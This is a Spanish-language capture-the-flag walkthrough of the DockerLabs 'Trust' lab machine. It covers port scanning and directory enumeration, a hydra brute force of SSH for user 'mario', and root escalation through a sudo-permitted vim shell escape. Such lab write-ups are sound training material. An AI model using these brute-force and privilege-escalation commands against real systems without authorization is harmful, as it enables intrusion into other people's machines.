## Introducción

Este documento presenta la resolución completa de la máquina **Trust**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Muy Fácil**.
El laboratorio expone un servidor web que contiene un archivo `secret.php` que revela un nombre de usuario válido. A partir de esta información, se realiza un ataque de fuerza bruta contra el servicio SSH para obtener acceso al sistema como el usuario `mario`.
Una vez dentro, se identifica una configuración insegura de `sudo` que permite ejecutar el binario `vim` como root sin autenticación adicional, facilitando una escalada de privilegios inmediata hasta obtener acceso completo como `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip trust.zip
sudo bash auto_deplo.sh trust.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748330180/ipScan_ep75kl.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Trust/{content,exploits,nmap,scripts}
cd Trust
```

---

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **80/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1748330181/Ports_l1tllf.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

![Servicios detectados](https://res.cloudinary.com/dewqswzke/image/upload/v1748330183/Services_kgmwh2.png)

---

### 1.3 Enumeración web

Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 80:

```bash
gobuster dir -u http://172.17.0.2/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
  -x php,html,txt -t 200
```

![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1748330183/Services_kgmwh2.png)

Se descubre un archivo interesante: `secret.php`. Al acceder desde el navegador, se muestra un mensaje que revela un posible nombre de usuario.

![Mario](https://res.cloudinary.com/dewqswzke/image/upload/v1748330181/Mario_c3bsts.png)

## Paso 2 — Explotación (Acceso inicial)

Con el nombre de usuario identificado (`mario`), se realiza un ataque de fuerza bruta contra el servicio SSH utilizando el diccionario `rockyou.txt`:

```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
```

![Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1748330180/hydra_c9c82i.png)

Hydra encuentra la contraseña correcta, lo que permite acceder al sistema mediante SSH:

```bash
ssh mario@172.17.0.2
```

---

## Paso 3 — Escalada de privilegios

### 3.1 De mario → root

Al acceder al sistema, se verifican los permisos sudo del usuario:

```bash
sudo -l
```

![Sudo](https://res.cloudinary.com/dewqswzke/image/upload/v1748330183/Sudo_jol6rg.png)

El usuario puede ejecutar el binario `vim` como root sin necesidad de contraseña.

Se utiliza `searchbins` para verificar si existe una ruta en GTFOBins:

```bash
searchbins -b vim -f sudo
```

Se ejecuta el siguiente comando para obtener una shell con privilegios de root:

```bash
sudo vim -c ':! /bin/sh'
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1748330182/Root_lxavsn.png)
